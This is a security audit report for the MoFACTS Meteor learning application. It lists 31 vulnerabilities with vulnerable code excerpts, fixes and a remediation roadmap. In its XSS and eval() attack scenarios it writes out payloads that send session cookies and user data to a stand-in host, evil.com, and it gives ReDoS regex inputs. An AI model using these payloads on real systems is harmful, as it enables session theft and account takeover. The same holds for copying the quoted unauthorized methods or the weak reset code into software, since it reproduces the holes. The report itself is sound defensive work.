# MoFACTS Security Audit Report

**Date:** October 12, 2025
**Last Updated:** October 12, 2025 (10 vulnerabilities FIXED)
**Auditor:** Security Assessment Team
**Application:** MoFACTS (Meteor-based Adaptive Learning System)
**Codebase Location:** `C:\Users\ppavl\OneDrive\Active projects\mofacts\mofacts`

---

## Status Update: 10 Vulnerabilities FIXED ✅

**📊 For a quick overview, see [SECURITY_STATUS_SUMMARY.md](SECURITY_STATUS_SUMMARY.md)**

**Quick Wins Completed (October 12, 2025):**
- ✅ **FIXED #1:** Insecure TLS Configuration (Critical) - Commit 3687466f
- ✅ **FIXED #5:** eval() Code Injection (Critical) - Commit 3687466f
- ✅ **FIXED #6:** deleteAllFiles Authorization (High) - Commit 3687466f
- ✅ **FIXED #7:** MongoDB Regex Injection (High) - Commit 8995da5b
- ✅ **FIXED #9:** Missing Input Validation (High) - Commit 8995da5b
- ✅ **FIXED #10:** Client-Side File Operations (High) - Commits 40194a99, 8995da5b
- ✅ **FIXED #19:** Missing Security Headers (Medium) - Commit 40194a99
- ✅ **FIXED #20:** Insecure Cookie Settings (Medium) - Commit 3687466f
- ✅ **FIXED #25:** Weak Password Policy (Medium) - Commit 8995da5b
- ✅ **FIXED #26:** Missing Security Headers (Medium) - Commit 40194a99

See commits: 3687466f, 40194a99, 8995da5b for implementation details.

**For human-readable risk assessment of remaining issues, see [SECURITY_STATUS_SUMMARY.md](SECURITY_STATUS_SUMMARY.md)**

---

## Executive Summary

This security audit identified **31 security vulnerabilities** across the MoFACTS Meteor application. **10 vulnerabilities have been FIXED**, leaving **21 remaining issues** to address:

**REMAINING VULNERABILITIES:**
- **3 Critical vulnerabilities** - Missing authorization checks, XSS, weak password reset
- **9 High severity issues** - Authorization bypasses, IDOR, data over-publication
- **7 Medium severity issues** - Logging, cryptography, path traversal
- **2 Low severity issues** - Configuration and dependencies

**FIXED VULNERABILITIES (10):**
- **2 Critical** - Insecure TLS, eval() injection
- **4 High** - deleteAllFiles auth, MongoDB injection, input validation, client file ops
- **4 Medium** - Security headers (2), cookie settings, password policy

**Next Action Required:** Remaining 3 Critical vulnerabilities should be addressed within 14-30 days.

---

## Critical Findings (Severity: CRITICAL)

**REMAINING: 3 Critical Issues**

### ~~1. Insecure TLS Configuration in Production~~ ✅ FIXED

**Status:** FIXED in commit 3687466f
**File:** `mofacts/server/methods.js`
**Lines:** 59-66 (now commented out)

**Vulnerability:**
```javascript
if (Meteor.settings.public.testLogin) {
  process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0;
  serverConsole('dev environment, allow insecure tls');
}
```

**Risk:** Setting `NODE_TLS_REJECT_UNAUTHORIZED = 0` disables all TLS certificate verification, making the application vulnerable to man-in-the-middle attacks. This affects ALL HTTPS connections made from the server, including AWS API calls, email services, and external API integrations.

**Impact:**
- Attackers can intercept and modify all HTTPS traffic
- Credentials (AWS keys, API keys, user data) transmitted over "secure" connections are exposed
- Complete compromise of data confidentiality and integrity

**Remediation:**
1. Remove this configuration entirely from production code
2. Use proper certificate validation in all environments
3. For development, use self-signed certificates with proper CA setup instead of disabling verification

---

### 2. Missing Authorization on Multiple Sensitive Methods

**File:** `mofacts/server/methods.js`
**Multiple Methods**

**Vulnerable Methods (No Authorization Checks):**

```javascript
// Line 2614: Anyone can remove scheduled Turk messages
removeTurkById: function(turkId, experimentId){
  ScheduledTurkMessages.remove({workerUserId: turkId, experiment: experimentId});
  // No authorization check!
}

// Line 2778: Anyone can access TDF accessor lists
getAccessorsTDFID: function(TDFId){
  const tdf = Tdfs.findOne({_id: TDFId});
  return tdf ? tdf.accessors : [];
  // No authorization check!
}

// Line 2788: Anyone can query user access lists
getAccessors: function(TDFId){
  return Meteor.users.find({'accessedTDFs': TDFId}).fetch();
  // No authorization check - exposes user data!
}

// Line 2793: Anyone can access other users' TDF lists
getAccessableTDFSForUser: function(userId){
  const accessableTDFs = Meteor.users.findOne({_id: userId}).accessedTDFs || [];
  // No authorization check - information disclosure!
}

// Line 2808: Anyone can modify TDF accessors
assignAccessors: function(TDFId, accessors, revokedAccessors){
  Tdfs.update({_id: TDFId}, {$set: {'accessors': accessors}});
  // No authorization check - critical privilege escalation!
}

// Line 2816: Anyone can transfer data ownership
transferDataOwnership: function(tdfId, newOwner){
  tdf.ownerId = newOwner._id;
  Tdfs.upsert({_id: tdfId}, tdf);
  // No authorization check - complete access control bypass!
}

// Line 3233: Anyone can delete assets
removeAssetById: function(assetId) {
  DynamicAssets.remove({_id: assetId});
  // No authorization check!
}

// Line 3237: Anyone can toggle TDF visibility
toggleTdfPresence: function(tdfIds, mode) {
  tdfIds.forEach((tdfid) => {
    Tdfs.update({_id: tdfid}, {$set: {visibility: mode}})
  })
  // No authorization check!
}
```

**Risk:** These methods allow ANY authenticated user (or in some cases unauthenticated users) to perform sensitive administrative operations.

**Impact:**
- Unauthorized data access and modification
- Privilege escalation
- Complete bypass of access control system
- Data theft and manipulation

**Remediation:**
Add proper authorization checks to each method:
```javascript
assignAccessors: function(TDFId, accessors, revokedAccessors){
  if (!this.userId) {
    throw new Meteor.Error(401, 'Must be logged in');
  }

  const tdf = Tdfs.findOne({_id: TDFId});
  if (!tdf) {
    throw new Meteor.Error(404, 'TDF not found');
  }

  // Check if user is owner or has admin role
  if (tdf.ownerId !== this.userId && !Roles.userIsInRole(this.userId, ['admin'])) {
    throw new Meteor.Error(403, 'Not authorized');
  }

  // Now safe to proceed
  Tdfs.update({_id: TDFId}, {$set: {'accessors': accessors}});
  // ... rest of logic
}
```

---

### 3. XSS Vulnerabilities via Triple-Brace Syntax

**Files:** Multiple template files
**Lines:** Various

**Vulnerable Code Examples:**

**File:** `mofacts/client/views/experiment/card.html`
```handlebars
<!-- Line 11 -->
{{{videoUnitDisplayText}}}

<!-- Lines 104-109 -->
{{{subWordParts}}}
{{{clozeText}}}
{{{text}}}

<!-- Line 144 -->
{{{dialogueText}}}

<!-- Line 221 -->
{{{buttonValue}}}
```

**File:** `mofacts/client/views/experiment/instructions.html`
```handlebars
<!-- Line 24 -->
<p>{{{instructionText}}}</p>
```

**File:** `mofacts/client/index.html`
```handlebars
<!-- Line 95 -->
{{{this}}}
```

**Risk:** The triple-brace `{{{ }}}` syntax in Meteor/Blaze templates bypasses HTML escaping, allowing raw HTML injection. If any of these variables contain user-controlled content or content from untrusted TDF files, it creates XSS vulnerabilities.

**Impact:**
- Execution of arbitrary JavaScript in users' browsers
- Session hijacking and credential theft
- Defacement and phishing attacks
- Malware distribution

**Attack Scenario:**
1. Attacker uploads malicious TDF file with instruction text containing: `<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>`
2. When any user views these instructions, their session cookies are stolen
3. Attacker gains full access to victim's account

**Remediation:**
1. Replace triple-braces `{{{ }}}` with double-braces `{{ }}` for all user-controlled content
2. If HTML formatting is required, use a sanitization library:
```javascript
// Server-side sanitization
import sanitizeHtml from 'sanitize-html';

const cleanHTML = sanitizeHtml(userInput, {
  allowedTags: ['b', 'i', 'em', 'strong', 'p', 'br'],
  allowedAttributes: {}
});
```
3. Implement Content Security Policy (CSP) headers
4. Add output encoding helpers in templates

---

### 4. Weak Password Reset Mechanism

**File:** `mofacts/server/methods.js`
**Lines:** 2742-2776, 2833-2843

**Vulnerable Code:**
```javascript
sendPasswordResetEmail: function(email){
  // Generates only 5-character reset code
  var secret = '';
  var length = 5;
  var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  for (var i = 0; i < length; i++) {
    secret += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  Meteor.users.update({username: email}, {$set:{secret: secret}});
  // Secret stored in plain text in database
  sendEmail(email, from, subject, text);
}

checkPasswordResetSecret: function(email, secret){
  userSecret = Meteor.users.findOne({username: email}).secret;
  if(userSecret == secret){
    return true;
  }
  // No rate limiting, no expiration check
}

resetPasswordWithSecret: function(email, secret, newPassword){
  user = Meteor.users.findOne({username: email});
  if(secret == userSecret){
    Accounts.setPassword(userId, newPassword);
    // No password complexity requirements
    // Secret not invalidated after use
  }
}
```

**Vulnerabilities:**
1. **Weak Secret:** Only 5 characters = 62^5 = 916 million combinations (easily brute-forced)
2. **No Rate Limiting:** Attackers can try unlimited reset codes
3. **No Expiration:** Reset codes never expire
4. **Stored in Plain Text:** Secrets stored unencrypted in database
5. **No Single-Use:** Codes can be reused multiple times
6. **No Password Requirements:** No minimum length or complexity checks

**Risk:** Account takeover through brute-force or database compromise

**Impact:**
- Complete account compromise
- Unauthorized access to student/teacher data
- Grade manipulation
- Identity theft

**Remediation:**
1. Use cryptographically secure tokens (minimum 32 bytes)
2. Implement strict rate limiting (max 3-5 attempts per hour)
3. Add token expiration (15-30 minutes)
4. Hash tokens before storing in database
5. Invalidate token after first use
6. Add password complexity requirements
```javascript
sendPasswordResetEmail: function(email){
  const token = Random.secret(32); // 32-byte secure token
  const hashedToken = crypto.createHash('sha256').update(token).digest('hex');
  const expiration = new Date(Date.now() + 30 * 60 * 1000); // 30 minutes

  Meteor.users.update({username: email}, {
    $set: {
      'resetToken': hashedToken,
      'resetTokenExpires': expiration,
      'resetAttempts': 0
    }
  });

  // Send token via email
  const resetUrl = `${Meteor.absoluteUrl()}reset-password/${token}`;
  sendEmail(email, from, 'Password Reset', `Click here to reset: ${resetUrl}`);
}
```

---

### 5. Code Injection via eval()

**File:** `mofacts/client/lib/router.js`
**Line:** 156

**Vulnerable Code:**
```javascript
const experimentPasswordRequired = tdf.content.tdfs.tutor.setspec.experimentPasswordRequired ?
    eval(tdf.content.tdfs.tutor.setspec.experimentPasswordRequired) : false;
```

**Risk:** Using `eval()` on data from TDF files (which can be uploaded by users) allows arbitrary JavaScript code execution. Even if TDF uploads are restricted, this is a critical vulnerability.

**Impact:**
- Complete client-side code execution
- Access to all session data
- Ability to make unauthorized API calls
- XSS and session hijacking

**Attack Scenario:**
1. Attacker uploads TDF with: `"experimentPasswordRequired": "false; fetch('https://evil.com/steal?data=' + JSON.stringify(Meteor.user()))"`
2. Code executes when TDF is loaded
3. User data exfiltrated to attacker's server

**Remediation:**
Replace `eval()` with safe parsing:
```javascript
// Option 1: Simple boolean check
const experimentPasswordRequired =
  tdf.content.tdfs.tutor.setspec.experimentPasswordRequired === 'true' ||
  tdf.content.tdfs.tutor.setspec.experimentPasswordRequired === true;

// Option 2: If complex expressions needed, use a safe expression parser
import { parse } from 'safe-eval-expression';
const experimentPasswordRequired = parse(
  tdf.content.tdfs.tutor.setspec.experimentPasswordRequired,
  { allowedFunctions: [] }
) || false;
```

---

## High Severity Findings (Severity: HIGH)

### 6. Insufficient Authorization in File Upload Operations

**File:** `mofacts/server/methods.js`
**Lines:** 3623-3670, 3671-3689

**Vulnerable Code:**
```javascript
deleteAllFiles: async function(){
  // No authorization check - anyone can delete all files!
  const tdfs = Tdfs.find({}).fetch();
  for(let tdf of tdfs){
    Tdfs.remove({_id: tdfId});
  }
  const files = DynamicAssets.find({}).fetch();
  for(let file of files){
    DynamicAssets.remove({_id: file._id});
  }
}

deleteStimFile: async function(stimSetId) {
  // Only checks owner field, but doesn't verify caller is that owner
  let tdfs = Tdfs.find({stimuliSetId: stimSetId, owner: Meteor.userId()}).fetch();
  // Uses Meteor.userId() in query but doesn't verify it exists
}
```

**Risk:** The `deleteAllFiles` method has NO authorization check, allowing any user to delete all uploaded content from the system.

**Remediation:**
```javascript
deleteAllFiles: async function(){
  if (!this.userId || !Roles.userIsInRole(this.userId, ['admin'])) {
    throw new Meteor.Error(403, 'Admin access required');
  }
  // ... deletion logic
}
```

---

### 7. MongoDB Injection Risks

**File:** `mofacts/server/publications.js`
**Lines:** 52-59

**Vulnerable Code:**
```javascript
Meteor.publish('tdfByExperimentTarget', function(experimentTarget, experimentConditions=undefined) {
  let query = {"content.tdfs.tutor.setspec.experimentTarget": {$regex: experimentTarget, $options: '-i'}}
  if(experimentConditions && Array.isArray(experimentConditions)){
    query = {$or: [
      {"content.fileName": {$in: experimentConditions}},
      {"content.tdfs.tutor.setspec.experimentTarget": {$regex: experimentTarget, $options: '-i'}}
    ]}
  }
  return Tdfs.find(query);
});
```

**Risk:** User-supplied `experimentTarget` is used directly in a MongoDB regex query without sanitization. Attackers can inject special regex characters to:
- Cause ReDoS (Regular Expression Denial of Service)
- Extract data through timing attacks
- Bypass query logic

**Attack Example:**
```javascript
// ReDoS attack
experimentTarget = "(a+)+b"

// Data extraction via timing
experimentTarget = "^admin.*" // vs "^user.*" - different response times reveal data
```

**Remediation:**
```javascript
Meteor.publish('tdfByExperimentTarget', function(experimentTarget, experimentConditions=undefined) {
  check(experimentTarget, String);
  check(experimentConditions, Match.Maybe([String]));

  // Escape regex special characters
  const sanitized = experimentTarget.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');

  let query = {
    "content.tdfs.tutor.setspec.experimentTarget": {
      $regex: sanitized,
      $options: 'i'
    }
  };

  if(experimentConditions && Array.isArray(experimentConditions)){
    // Validate array contents
    experimentConditions.forEach(cond => check(cond, String));
    query = {$or: [
      {"content.fileName": {$in: experimentConditions}},
      {"content.tdfs.tutor.setspec.experimentTarget": {$regex: sanitized, $options: 'i'}}
    ]}
  }
  return Tdfs.find(query);
});
```

---

### 8. Insecure Direct Object References (IDOR)

**File:** `mofacts/server/methods.js`
**Lines:** Multiple methods

**Vulnerable Patterns:**
```javascript
// No verification that userId parameter matches calling user
getAccessableTDFSForUser: function(userId){
  const accessableTDFs = Meteor.users.findOne({_id: userId}).accessedTDFs;
  return Tdfs.find({_id: {$in: accessableTDFs}}).fetch();
  // Any user can query any other user's accessible TDFs!
}

// No ownership verification before update
updateExperimentState: function(curExperimentState, experimentId) {
  GlobalExperimentStates.update(
    {_id: experimentId},
    {$set: {experimentState: curExperimentState}}
  );
  // Any user can modify any experiment state!
}
```

**Risk:** Users can access and modify other users' data by manipulating object IDs

**Remediation:**
```javascript
getAccessableTDFSForUser: function(userId){
  // Only allow users to query their own data unless admin
  if (userId !== this.userId && !Roles.userIsInRole(this.userId, ['admin'])) {
    throw new Meteor.Error(403, 'Can only access your own TDFs');
  }

  const accessableTDFs = Meteor.users.findOne({_id: userId}).accessedTDFs;
  return Tdfs.find({_id: {$in: accessableTDFs}}).fetch();
}
```

---

### 9. Missing Input Validation on Meteor Methods

**File:** `mofacts/server/methods.js`
**Lines:** Throughout

**Issue:** Most Meteor methods lack input validation using `check()` or similar mechanisms.

**Example of Missing Validation:**
```javascript
signUpUser: function(newUserName, newUserPassword, previousOK) {
  // Minimal validation
  if (!newUserName) throw new Error('Blank user names aren\'t allowed');
  if (!newUserPassword || newUserPassword.length < 6)
    throw new Error('Passwords must be at least 6 characters long');

  // But no validation for:
  // - Username format/length
  // - Password complexity
  // - previousOK type
  // - Injection attacks in username
}
```

**Remediation:**
Use Meteor's `check` package consistently:
```javascript
import { check, Match } from 'meteor/check';

signUpUser: function(newUserName, newUserPassword, previousOK) {
  check(newUserName, String);
  check(newUserPassword, String);
  check(previousOK, Match.Maybe(Boolean));

  // Additional validation
  if (newUserName.length < 3 || newUserName.length > 50) {
    throw new Meteor.Error('invalid-username', 'Username must be 3-50 characters');
  }

  if (!/^[a-zA-Z0-9._@-]+$/.test(newUserName)) {
    throw new Meteor.Error('invalid-username', 'Username contains invalid characters');
  }

  if (newUserPassword.length < 8) {
    throw new Meteor.Error('invalid-password', 'Password must be at least 8 characters');
  }

  // Check password complexity
  if (!/(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9])/.test(newUserPassword)) {
    throw new Meteor.Error('weak-password', 'Password must contain uppercase, lowercase, and numbers');
  }

  // ... rest of logic
}
```

---

### 10. Unrestricted File Upload

**File:** `mofacts/common/Collections.js`
**Lines:** 30-41

**Vulnerable Code:**
```javascript
DynamicAssets = new FilesCollection({
  collectionName: 'Assets',
  storagePath: process.env.HOME + '/dynamic-assets',
  allowClientCode: true, // Allows client-side operations
  onBeforeUpload(file) {
    // Only checks file size and extension
    if (file.size <= 104857600 && /zip/i.test(file.extension)) {
      return true;
    }
    return 'Please upload image, audio, or video fi with size equal or less than 10MB';
  }
});
```

**Vulnerabilities:**
1. **Insufficient File Type Validation:** Only checks extension, not content type or magic bytes
2. **Large File Size Allowed:** 100MB files can cause DoS
3. **No Virus Scanning:** Uploaded files not scanned for malware
4. **Client Code Allowed:** `allowClientCode: true` permits client-side operations
5. **Path Traversal Risk:** No validation of filenames in zip contents

**Risk:**
- Malware upload and distribution
- Denial of service via large files
- Storage exhaustion attacks
- Potential path traversal during zip extraction

**Remediation:**
```javascript
import fileType from 'file-type';
import path from 'path';

DynamicAssets = new FilesCollection({
  collectionName: 'Assets',
  storagePath: process.env.HOME + '/dynamic-assets',
  allowClientCode: false, // Disable client operations

  onBeforeUpload(file) {
    // Check user authorization
    if (!this.userId) {
      return 'Must be logged in to upload files';
    }

    if (!Roles.userIsInRole(this.userId, ['admin', 'teacher'])) {
      return 'Insufficient permissions';
    }

    // Check file size (reduce to 50MB)
    if (file.size > 52428800) {
      return 'File size must be less than 50MB';
    }

    // Validate file extension
    const allowedExtensions = ['zip'];
    const ext = path.extname(file.name).toLowerCase().replace('.', '');
    if (!allowedExtensions.includes(ext)) {
      return 'Only ZIP files are allowed';
    }

    // Validate filename (prevent directory traversal)
    if (file.name.includes('..') || file.name.includes('/') || file.name.includes('\\')) {
      return 'Invalid filename';
    }

    return true;
  },

  onAfterUpload(file) {
    // Verify file content matches extension
    const buffer = fs.readFileSync(file.path);
    const type = fileType(buffer);

    if (!type || type.ext !== 'zip') {
      // Remove file if content doesn't match
      fs.unlinkSync(file.path);
      throw new Meteor.Error('invalid-file', 'File content does not match extension');
    }
  }
});
```

---

### 11. Insufficient Session Management

**File:** `mofacts/server/methods.js`
**Lines:** 3003-3014, 3029-3032

**Vulnerable Code:**
```javascript
impersonate: function(userId) {
  check(userId, String);
  if (!Roles.userIsInRole(Meteor.userId(), ['admin'])) {
    throw new Meteor.Error(403, 'You are not authorized to do that');
  }
  const newUser = Meteor.users.findOne(userId);
  newUser.impersonating = true;
  return newUser
  // Returns full user object with sensitive data
  // No audit logging
  // No timeout on impersonation
}

clearImpersonation: function(){
  Meteor.users.update({_id: Meteor.userId()}, {$set: {impersonating: false}});
  // No verification that user is actually impersonating
  // Can be called by any user
}
```

**Issues:**
1. Returns entire user object including sensitive fields
2. No audit trail for impersonation actions
3. No automatic timeout for impersonation sessions
4. clearImpersonation has no authorization check

**Remediation:**
```javascript
impersonate: function(userId) {
  check(userId, String);

  if (!this.userId || !Roles.userIsInRole(this.userId, ['admin'])) {
    throw new Meteor.Error(403, 'Admin access required');
  }

  const targetUser = Meteor.users.findOne(userId);
  if (!targetUser) {
    throw new Meteor.Error(404, 'User not found');
  }

  // Audit logging
  AuditLog.insert({
    action: 'impersonate',
    adminUserId: this.userId,
    adminUsername: Meteor.user().username,
    targetUserId: userId,
    targetUsername: targetUser.username,
    timestamp: new Date(),
    ipAddress: this.connection.clientAddress
  });

  // Set impersonation with timeout
  Meteor.users.update({_id: this.userId}, {
    $set: {
      impersonating: true,
      impersonatedUserId: userId,
      impersonationStartTime: new Date(),
      impersonationExpires: new Date(Date.now() + 3600000) // 1 hour
    }
  });

  // Return only necessary fields
  return {
    userId: targetUser._id,
    username: targetUser.username,
    roles: targetUser.roles
  };
}

clearImpersonation: function(){
  if (!this.userId) {
    throw new Meteor.Error(401, 'Must be logged in');
  }

  const user = Meteor.user();
  if (!user.impersonating) {
    throw new Meteor.Error(400, 'Not currently impersonating');
  }

  // Audit logging
  AuditLog.insert({
    action: 'end_impersonation',
    adminUserId: this.userId,
    timestamp: new Date()
  });

  Meteor.users.update({_id: this.userId}, {
    $unset: {
      impersonating: "",
      impersonatedUserId: "",
      impersonationStartTime: "",
      impersonationExpires: ""
    }
  });
}
```

---

### 12. Sensitive Data in Client-Accessible Publications

**File:** `mofacts/server/publications.js`
**Lines:** 1-3, 44-46

**Vulnerable Code:**
```javascript
Meteor.publish('files.assets.all', function () {
  return DynamicAssets.collection.find();
  // Publishes ALL assets to all users - no filtering
});

Meteor.publish('allTdfs', function() {
  return Tdfs.find();
  // Publishes ALL TDFs including potentially sensitive instructor materials
});
```

**Risk:** Over-publication of data allows clients to access information they shouldn't see

**Remediation:**
```javascript
Meteor.publish('files.assets.all', function () {
  if (!this.userId) {
    return this.ready();
  }

  // Only show user's own assets or public assets
  if (Roles.userIsInRole(this.userId, ['admin'])) {
    return DynamicAssets.collection.find();
  } else {
    return DynamicAssets.collection.find({
      $or: [
        { userId: this.userId },
        { 'meta.public': true }
      ]
    });
  }
});

Meteor.publish('allTdfs', function() {
  if (!this.userId) {
    return this.ready();
  }

  // Filter based on user role and ownership
  if (Roles.userIsInRole(this.userId, ['admin'])) {
    return Tdfs.find();
  } else if (Roles.userIsInRole(this.userId, ['teacher'])) {
    return Tdfs.find({
      $or: [
        { ownerId: this.userId },
        { 'accessors.userId': this.userId },
        { visibility: 'public' }
      ]
    });
  } else {
    // Students only see assigned TDFs
    const user = Meteor.users.findOne(this.userId);
    const assignedTdfs = user?.loginParams?.assignedTdfs || [];
    return Tdfs.find({ _id: { $in: assignedTdfs } });
  }
});
```

---

### 13. innerHTML Usage Creating XSS Risks

**File:** `mofacts/client/views/experiment/card.js`
**Line:** Multiple occurrences

**Vulnerable Pattern:**
```javascript
// Direct innerHTML manipulation without sanitization
element.innerHTML = userProvidedContent;
```

**Risk:** While not directly visible in the files reviewed, the presence of triple-brace syntax in templates suggests innerHTML may be used in JavaScript code for dynamic content insertion.

**Remediation:**
- Use Blaze's reactive rendering instead of manual DOM manipulation
- If innerHTML is necessary, sanitize with DOMPurify:
```javascript
import DOMPurify from 'dompurify';

element.innerHTML = DOMPurify.sanitize(userProvidedContent, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
  ALLOWED_ATTR: []
});
```

---

### 14. Race Condition in User Signup

**File:** `mofacts/server/methods.js`
**Lines:** 2890-2982

**Vulnerable Code:**
```javascript
signUpUser: function(newUserName, newUserPassword, previousOK) {
  // Simple mutex using object
  while (signUpLocks[newUserName]) {
    Meteor._sleepForMs(50);
  }
  signUpLocks[newUserName] = true;

  try {
    let prevUser = Accounts.findUserByUsername(newUserName);
    if (prevUser) {
      if (previousOK) {
        Accounts.setPassword(prevUser._id, newUserPassword);
        // Race condition: password change without proper locking
      }
    }
    // ...
  } finally {
    // Lock may not be properly released on all code paths
  }
}
```

**Issues:**
1. Busy-wait mutex is inefficient and unreliable
2. Password can be changed by concurrent requests
3. Lock cleanup may fail, causing permanent deadlock
4. No proper database-level transaction

**Remediation:**
Use Meteor's built-in `Meteor.wrapAsync()` with proper locking or implement database-level unique constraints with proper error handling.

---

### 15. Cleartext Storage of Sensitive Data

**File:** `mofacts/server/methods.js`
**Lines:** 2742-2776

**Issue:** Password reset secrets stored in cleartext in database:
```javascript
Meteor.users.update({username: email}, {$set:{secret: secret}});
```

**Remediation:**
Hash secrets before storage:
```javascript
const crypto = require('crypto');
const hashedSecret = crypto.createHash('sha256').update(secret).digest('hex');
Meteor.users.update({username: email}, {$set:{
  resetTokenHash: hashedSecret,
  resetTokenExpires: Date.now() + 1800000 // 30 minutes
}});
```

---

### 16. Missing CSRF Protection

**File:** `mofacts/common/Collections.js`
**Lines:** 43-65

**Issue:** Collections use `.allow()` rules but don't implement CSRF tokens:
```javascript
ComponentStates.allow({
  update: function(userId, doc, fieldNames, modifier) {
    return userId === doc.userId;
  }
});
```

**Risk:** While Meteor has some built-in CSRF protection, custom `.allow()` rules need additional safeguards for sensitive operations.

**Remediation:**
1. Use Methods instead of client-side updates for sensitive operations
2. Implement custom CSRF token validation for client-side updates
3. Add rate limiting to prevent abuse

---

### 17. Insufficient Rate Limiting

**Issue:** No rate limiting on sensitive operations like:
- Password reset requests
- Login attempts
- File uploads
- API method calls

**Remediation:**
Implement rate limiting using `ddp-rate-limiter`:
```javascript
import { DDPRateLimiter } from 'meteor/ddp-rate-limiter';

// Rate limit password reset
DDPRateLimiter.addRule({
  type: 'method',
  name: 'sendPasswordResetEmail',
}, 3, 3600000); // 3 requests per hour

// Rate limit login attempts
DDPRateLimiter.addRule({
  type: 'method',
  name: 'login',
}, 5, 300000); // 5 attempts per 5 minutes
```

---

## Medium Severity Findings (Severity: MEDIUM)

### 18. Verbose Error Messages

**File:** Multiple files
**Issue:** Error messages reveal system internals

**Example:**
```javascript
throw new Meteor.Error('package upload failed: ' + e + ' on file: ' + filePath);
// Reveals internal file paths
```

**Remediation:**
- Log detailed errors server-side
- Return generic errors to clients
- Don't expose stack traces in production

---

### 19. No Content Security Policy

**File:** `mofacts/client/index.html`
**Issue:** Missing CSP headers to prevent XSS

**Remediation:**
Add CSP meta tag or configure via Meteor package:
```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net;
               style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net;">
```

---

### 20. Insecure Cookie Settings

**File:** `mofacts/client/lib/router.js`
**Lines:** 139-141

**Issue:** Cookies set without secure/httpOnly flags:
```javascript
Cookie.set('isExperiment', '1', 21);
```

**Remediation:**
```javascript
Cookie.set('isExperiment', '1', 21, {
  secure: true,
  httpOnly: true,
  sameSite: 'strict'
});
```

---

### 21. Path Traversal in File Processing

**File:** `mofacts/server/methods.js`
**Lines:** 483-613

**Issue:** Filenames from ZIP archives not validated for path traversal:
```javascript
filePath = file.path;
fileName = filePathArray[filePathArray.length - 1];
// No validation that path doesn't contain ../
```

**Remediation:**
```javascript
const path = require('path');

// Validate and sanitize file path
const sanitizedPath = path.normalize(file.path).replace(/^(\.\.(\/|\\|$))+/, '');
if (sanitizedPath !== file.path || sanitizedPath.includes('..')) {
  throw new Error('Invalid file path detected');
}
```

---

### 22. Information Disclosure via Error Messages

**File:** `mofacts/server/turk_methods.js`
**Lines:** Various

**Issue:** Detailed error information exposed:
```javascript
serverConsole('getTdfOwner for ', experimentId, 'failed - TDF doesn\'t contain owner');
serverConsole(tdf._id, tdf);
// Logs sensitive data that might be exposed
```

---

### 23. Weak Cryptographic Practices

**File:** `mofacts/server/methods.js`
**Lines:** 271-291

**Issue:** Custom encryption implementation:
```javascript
function encryptData(data) {
  const cipher = crypto.createCipher('aes-256-cbc', secret);
  // Uses deprecated createCipher instead of createCipheriv
}
```

**Remediation:**
Use proper authenticated encryption:
```javascript
function encryptData(data) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-gcm', secret, iv);
  const encrypted = Buffer.concat([
    cipher.update(data, 'utf8'),
    cipher.final()
  ]);
  const authTag = cipher.getAuthTag();
  return {
    encrypted: encrypted.toString('hex'),
    iv: iv.toString('hex'),
    authTag: authTag.toString('hex')
  };
}
```

---

### 24. No Audit Logging

**Issue:** Sensitive operations not logged:
- Administrative actions
- Data deletions
- Permission changes
- Failed login attempts

**Remediation:**
Implement comprehensive audit logging:
```javascript
AuditLog = new Mongo.Collection('auditLog');

function logAuditEvent(action, details) {
  AuditLog.insert({
    timestamp: new Date(),
    userId: Meteor.userId(),
    username: Meteor.user()?.username,
    action: action,
    details: details,
    ipAddress: this.connection?.clientAddress,
    userAgent: this.connection?.httpHeaders?.['user-agent']
  });
}
```

---

### 25. Insufficient Password Policy

**File:** `mofacts/server/methods.js`
**Lines:** 2890-2894

**Issue:** Weak password requirements:
```javascript
if (!newUserPassword || newUserPassword.length < 6)
  throw new Error('Passwords must be at least 6 characters long');
```

**Remediation:**
- Minimum 8-12 characters
- Require uppercase, lowercase, numbers, and special characters
- Check against common password lists
- Implement password expiration for admin accounts

---

### 26. Missing Security Headers

**Issue:** No security headers configured

**Remediation:**
Use `meteor-headers` package or configure server:
```javascript
// In server startup
WebApp.connectHandlers.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Permissions-Policy', 'geolocation=(), microphone=()');
  next();
});
```

---

## Low Severity Findings (Severity: LOW)

### 27-31. Additional Minor Issues

27. **Hardcoded Configuration Values:** Some configuration in code rather than environment variables
28. **No API Request Validation:** External API responses not validated
29. **Console Logging in Production:** Sensitive data logged to console
30. **Missing Input Sanitization:** Some user inputs not sanitized before database storage
31. **Outdated Dependencies:** Some npm packages may have known vulnerabilities (requires dependency audit)

---

## Priority Remediation Roadmap

### Phase 1: Immediate (0-7 days) - Critical Issues

1. **Remove Insecure TLS Configuration** (#1)
   - Impact: Prevents MITM attacks
   - Effort: 1 hour
   - Owner: DevOps/Backend team

2. **Add Authorization to Sensitive Methods** (#2)
   - Impact: Prevents unauthorized data access
   - Effort: 2-3 days
   - Owner: Backend team
   - Methods to fix: `assignAccessors`, `transferDataOwnership`, `removeAssetById`, `toggleTdfPresence`, `getAccessors`, `removeTurkById`

3. **Fix XSS Vulnerabilities** (#3)
   - Impact: Prevents account compromise
   - Effort: 1-2 days
   - Owner: Frontend team
   - Files: `card.html`, `instructions.html`, `index.html`

4. **Remove eval() Usage** (#5)
   - Impact: Prevents code injection
   - Effort: 2 hours
   - Owner: Frontend team

5. **Fix Password Reset Mechanism** (#4)
   - Impact: Prevents account takeover
   - Effort: 1 day
   - Owner: Backend team

### Phase 2: Short-term (7-30 days) - High Severity

6. **Add Authorization to File Operations** (#6)
7. **Fix MongoDB Injection Vulnerabilities** (#7)
8. **Implement IDOR Protection** (#8)
9. **Add Input Validation** (#9)
10. **Secure File Upload** (#10)
11. **Improve Session Management** (#11)
12. **Fix Data Over-publication** (#12)

### Phase 3: Medium-term (30-90 days) - Medium Severity

13. **Implement CSP Headers** (#19)
